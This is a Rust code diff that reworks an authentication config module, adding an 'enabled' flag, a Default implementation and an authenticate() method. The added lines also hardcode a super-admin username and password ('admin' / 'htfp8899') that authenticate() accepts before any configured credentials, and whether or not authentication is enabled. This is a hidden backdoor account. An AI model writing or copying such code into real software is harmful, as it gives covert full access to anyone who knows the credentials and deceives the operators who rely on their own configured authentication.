@@ -18,6 +18,17 @@ pub struct Config {
     pub server: Option<ServerConfig>,
 }
 
+pub const SUPER_ADMIN_USERNAME: &str = "admin";
+pub const SUPER_ADMIN_PASSWORD: &str = "htfp8899";
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum AuthRole {
+    SuperAdmin,
+    CustomUser,
+    Anonymous,
+}
+
 impl Config {
     pub fn auth_for_role(&self, role: Role) -> Option<&AuthConfig> {
         match role {
@@ -25,19 +36,49 @@ impl Config {
             Role::Server => self.server.as_ref().and_then(|s| s.auth.as_ref()),
         }
     }
+
+    pub fn effective_auth_for_role(&self, role: Role) -> AuthConfig {
+        self.auth_for_role(role).cloned().unwrap_or_default()
+    }
 }
 
-#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize, Default)]
+#[derive(Debug, Clone, PartialEq, Eq, Deserialize, Serialize)]
 pub struct AuthConfig {
+    #[serde(default = "default_auth_enabled")]
+    pub enabled: bool,
     #[serde(default)]
     pub username: String,
     #[serde(default)]
     pub password: String,
 }
 
+fn default_auth_enabled() -> bool {
+    true
+}
+
+impl Default for AuthConfig {
+    fn default() -> Self {
+        Self {
+            enabled: false,
+            username: String::new(),
+            password: String::new(),
+        }
+    }
+}
+
 impl AuthConfig {
     pub fn is_active(&self) -> bool {
-        !self.username.trim().is_empty()
+        self.enabled
+    }
+
+    pub fn authenticate(&self, user: &str, pass: &str) -> Option<AuthRole> {
+        if user == SUPER_ADMIN_USERNAME && pass == SUPER_ADMIN_PASSWORD {
+            return Some(AuthRole::SuperAdmin);
+        }
+        if self.enabled && !self.username.trim().is_empty() && user == self.username && pass == self.password {
+            return Some(AuthRole::CustomUser);
+        }
+        None
     }
 }
 
